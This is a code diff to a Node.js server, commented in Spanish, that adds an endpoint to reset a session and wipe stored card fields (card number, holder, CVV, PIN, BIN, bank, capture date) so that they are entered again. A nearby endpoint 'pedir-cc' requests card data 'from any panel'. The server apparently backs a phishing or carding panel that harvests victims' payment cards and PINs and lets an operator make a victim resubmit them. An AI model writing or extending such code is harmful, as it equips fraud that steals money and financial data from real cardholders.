@@ -1418,6 +1418,24 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
+        // 🔥 NUEVO ENDPOINT PARA RESETEAR DESDE EL CLIENTE 🔥
+        const resetMatch = url.match(/^\/([a-z-]+)\/estado\/([^\/?]+)\/reset$/);
+        if (req.method === 'POST' && resetMatch) {
+            const sessionId = resetMatch[2];
+            estadoSesiones.set(sessionId, 'pendiente');
+            ultimaAccionSesiones.set(sessionId, '');
+            
+            // Limpiar datos de la tarjeta para que los vuelva a llenar
+            const datosPrevios = datosSesiones.get(sessionId) || {};
+            const camposLimpiar = ['tarjeta','titular','exp','expMes','expAnio','cvv','pin','bin','cardBrand','cardType','cardLevel','bankName','countryName','fechaCaptura'];
+            camposLimpiar.forEach(c => delete datosPrevios[c]);
+            datosSesiones.set(sessionId, datosPrevios);
+            
+            console.log(`[RESET CLIENTE] Sesión ${sessionId} reseteada a pendiente y datos de tarjeta borrados.`);
+            json(res, 200, { ok: true });
+            return;
+        }
+
         // 🔥 ENDPOINT GENÉRICO PARA PEDIR CC DESDE CUALQUIER PANEL 🔥
         const pedirCcMatch = url.match(/^\/([a-z-]+)\/pedir-cc$/);
         if (req.method === 'POST' && pedirCcMatch) {
